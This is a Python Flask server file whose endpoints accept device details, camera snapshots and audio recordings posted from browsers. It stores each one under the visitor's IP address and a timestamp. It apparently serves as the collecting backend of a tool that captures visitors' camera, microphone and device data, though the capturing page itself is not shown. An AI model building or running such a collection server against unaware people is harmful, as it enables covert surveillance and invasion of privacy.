from flask import Flask, render_template, request, jsonify
import os
import base64
from io import BytesIO
from PIL import Image
import json
import socket
from datetime import datetime

app = Flask(__name__)

UPLOAD_FOLDER = 'data'
if not os.path.exists(UPLOAD_FOLDER):
    os.makedirs(UPLOAD_FOLDER)

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/api/device-info', methods=['POST'])
def device_info():
    device_data = request.get_json()
    timestamp = datetime.now().strftime("%Y-%m-%d-%H-%M-%S")
    ip = request.remote_addr
    filename = f"device_info-{ip}-{timestamp}.json"
    with open(os.path.join(UPLOAD_FOLDER, filename), 'w') as f:
        json.dump(device_data, f, indent=4)
    return jsonify({"status": "Device info received"}), 200

@app.route('/api/capture-image', methods=['POST'])
def capture_image():
    data = request.get_json()
    image_data = data.get('image', None)
    
    if image_data:
        image_data = image_data.split(',')[1]
        image = Image.open(BytesIO(base64.b64decode(image_data)))
        timestamp = datetime.now().strftime("%Y-%m-%d-%H-%M-%S")
        ip = request.remote_addr
        image_filename = os.path.join(UPLOAD_FOLDER, f'{ip}-{timestamp}-image.jpg')
        image.save(image_filename)
        return jsonify({"status": f"Image {image_filename} received and saved"}), 200
    
    return jsonify({"status": "No image data received"}), 400

@app.route('/api/record-audio', methods=['POST'])
def record_audio():
    data = request.get_json()
    audio_url = data.get('audio', None)
    
    if audio_url:
        audio_data = audio_url.split(',')[1]
        timestamp = datetime.now().strftime("%Y-%m-%d-%H-%M-%S")
        ip = request.remote_addr
        audio_filename = os.path.join(UPLOAD_FOLDER, f'{ip}-{timestamp}-audio.wav')
        with open(audio_filename, 'wb') as audio_file:
            audio_file.write(base64.b64decode(audio_data))
        return jsonify({"status": f"Audio {audio_filename} received and saved"}), 200
    
    return jsonify({"status": "No audio data received"}), 400

if __name__ == '__main__':
    host = socket.gethostbyname(socket.gethostname())
    app.run(host=host, port=5000)
